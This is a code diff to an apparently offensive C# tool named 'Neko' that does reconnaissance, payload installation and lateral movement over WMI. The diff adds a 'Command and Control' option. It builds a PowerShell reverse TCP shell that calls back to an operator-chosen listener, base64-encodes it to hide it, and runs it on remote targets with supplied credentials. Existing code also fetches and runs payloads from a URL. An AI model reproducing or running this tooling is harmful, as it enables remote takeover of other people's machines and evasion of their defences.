@@ -30,10 +30,10 @@ namespace Recon
                 Console.WriteLine("Welcome to Neko. \r\n");
 
                 //Prompt user decision on recon or deployment via WMI
-                Console.WriteLine("Options: \r\n\r\n 1: Recon \r\n\r\n 2: Installation from C2 via WMI + PowerShell \r\n\r\n 3: Deployment via WMI \r\n");
+                Console.WriteLine("Options: \r\n\r\n 1: Recon \r\n\r\n 2: Installation from C2 via WMI + PowerShell \r\n\r\n 3: Deployment via WMI \r\n\r\n 4: Command and Control \r\n");
                 Console.WriteLine("Make your selection:");
                 string attackType = Console.ReadLine();
-                while (attackType != "1" && attackType != "2" && attackType != "3")
+                while (attackType != "1" && attackType != "2" && attackType != "3" && attackType != "4")
                 {
                     Console.WriteLine("Invalid selection. Enter '1' for Recon, '2' Deployment via WMI:");
                     attackType = Console.ReadLine();
@@ -444,7 +444,8 @@ namespace Recon
                             Console.WriteLine("\r\n + Choose file name for download:");
                             string fileName = Console.ReadLine();
 
-                            Console.WriteLine("Encoding commands for obfuscation");
+                            Console.WriteLine("\r\n" +
+                                "Encoding commands for obfuscation");
                             string concattedCommand = "Invoke-WebRequest -Uri '" + payloadURL + "'" + "-UseBasicParsing -OutFile " + downloadPath + "\\" + fileName;
 
                             byte[] encoded = Encoding.Unicode.GetBytes(concattedCommand);
@@ -461,19 +462,23 @@ namespace Recon
                             }
 
                             //Check if user wants to launch additional commands after payload installation
-                            Console.WriteLine("Would you like to launch additional commands? Enter 'y' or 'n':");
+                            Console.WriteLine("\r\n" +
+                                "Would you like to launch additional commands? Enter 'y' or 'n':");
                             string additionalCommands = Console.ReadLine();
                             while(additionalCommands != "y" && additionalCommands != "n")
                             {
-                                Console.WriteLine("Invalid selection. Would you like to launch additional commands? Enter 'y' or 'n':");
+                                Console.WriteLine("\r\n" +
+                                    "Invalid selection. Would you like to launch additional commands? Enter 'y' or 'n':");
                             }
                             if (additionalCommands == "y")
                             {
-                                Console.WriteLine("Please enter additional commands, for instance, launching your payload with cmd.exe");
+                                Console.WriteLine("\r\n" +
+                                    "Please enter additional commands, for instance, launching your payload with cmd.exe");
                                 string additionalCommandLine = Console.ReadLine();
 
                                 //Launching additional commands
-                                Console.WriteLine("Executing additional commands: " + additionalCommandLine);
+                                Console.WriteLine("\r\n" +
+                                    "Executing additional commands: " + additionalCommandLine);
                                 // Additional commands to attack targets
                                 foreach (string target in ipSplit)
                                 {
@@ -481,6 +486,66 @@ namespace Recon
                                 }
                             }
                         }
+                    }
+                }
+                //C2 via Reverse TCP Shell
+                if (attackType == "4")
+                {
+                    //Confirm that user wants to launch reverse shell
+                    Console.WriteLine("\r\n" +
+                        "Launch reverse TCP shell to specified target? Enter 'y' or 'n':");
+                    string c2Choice = Console.ReadLine();
+                    while (c2Choice != "y" && c2Choice != "n")
+                    {
+                        Console.WriteLine("Invalid selection. Launch reverse TCP shell to specified target? Enter 'y' or 'n':");
+                    }
+                    if(c2Choice == "y")
+                    {
+
+                        //Get Username
+                        Console.WriteLine("Enter user name:");
+                        string wmiUsername = Console.ReadLine();
+                        //Password
+                        Console.WriteLine("Enter password:");
+                        string wmiPassword = Console.ReadLine();
+
+                        //Get IP for target
+                        Console.WriteLine("Please enter IP address for target: ");
+                        string targetIP = Console.ReadLine();
+                        //Check if target IP is valid
+                        if (ValidateIP(targetIP) == false)
+                        {
+                            Console.WriteLine("Invalid IP. Please enter valid IP address: ");
+                            targetIP = Console.ReadLine();
+                        }
+
+                        Console.WriteLine("Enter listener IP: ");
+                        string listenerIP = Console.ReadLine();
+                        //Check if listener IP is valid
+                        if (ValidateIP(listenerIP) == false)
+                        {
+                            Console.WriteLine("Invalid IP. Please enter valid IP address: ");
+                            listenerIP = Console.ReadLine();
+                        }
+                        //Get port choice from user
+                        Console.WriteLine("Enter port for communication. Leave blank for default (port 80):");
+                        string reversePort = Console.ReadLine();
+
+                        if (reversePort == "")
+                        {
+                            reversePort = "80";
+                        }
+
+                        string reverseShell = @"$client=New-Object System.Net.Sockets.TCPClient('" + listenerIP + @"'," + reversePort +@");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes, 0, $bytes.Length)) -ne
+                        0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + 'PS ' +
+                        (pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+
+                        Console.WriteLine("\r\n" +
+                                "Encoding commands for obfuscation");
+
+                        byte[] encoded = Encoding.Unicode.GetBytes(reverseShell);
+                        string obfuscatedCommand = Convert.ToBase64String(encoded);
+                        AttackWMI(wmiUsername, wmiPassword, domainURL, targetIP, obfuscatedCommand);
                     }
                 }
 
